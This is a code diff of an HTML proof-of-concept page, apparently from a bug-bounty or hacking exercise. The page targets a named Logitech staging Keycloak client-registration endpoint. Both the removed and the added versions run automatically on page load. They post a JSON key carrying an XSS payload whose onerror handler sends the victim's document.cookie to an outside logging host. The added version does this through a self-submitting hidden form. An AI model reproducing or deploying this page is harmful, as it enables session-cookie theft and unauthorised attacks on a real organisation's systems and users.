@@ -1,34 +1,17 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>PoC XSS</title>
-    <script>
-      function sendXSS() {
-        const xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://stg-datagenie.np.logitech.io/auth/realms/master/clients-registrations/default", true);
-        xhr.setRequestHeader("Content-Type", "application/json");
+<head>
+  <title>XSS PoC</title>
+</head>
+<body>
+  <h1>XSS PoC by PHIMS</h1>
+  <form id="xss-form" method="POST" action="https://stg-datagenie.np.logitech.io/auth/realms/master/clients-registrations/default">
+    <input type="hidden" name="payload" value='{"<img src=x onerror=fetch(`https://www.phims.tech/log.php?c=`+document.cookie)>":1}'>
+    <input type="submit" value="Submit XSS Payload">
+  </form>
 
-        // Ganti URL webhook kamu di sini
-        const webhook = "https://www.phims.tech/log.php";
-
-        const payload = {
-          "<img src='x' onerror='fetch(`" + webhook + "?cookie=`+document.cookie)'>": 1
-        };
-
-        xhr.onreadystatechange = function () {
-          if (xhr.readyState === 4) {
-            // Optional: Tampilkan hasilnya ke iframe, atau alert
-            alert("Response received. Check webhook.");
-          }
-        };
-
-        xhr.send(JSON.stringify(payload));
-      }
-
-      window.onload = sendXSS;
-    </script>
-  </head>
-  <body>
-    <h1>Testing XSS Payload... Please wait</h1>
-  </body>
+  <script>
+    document.getElementById("xss-form").submit();
+  </script>
+</body>
 </html>
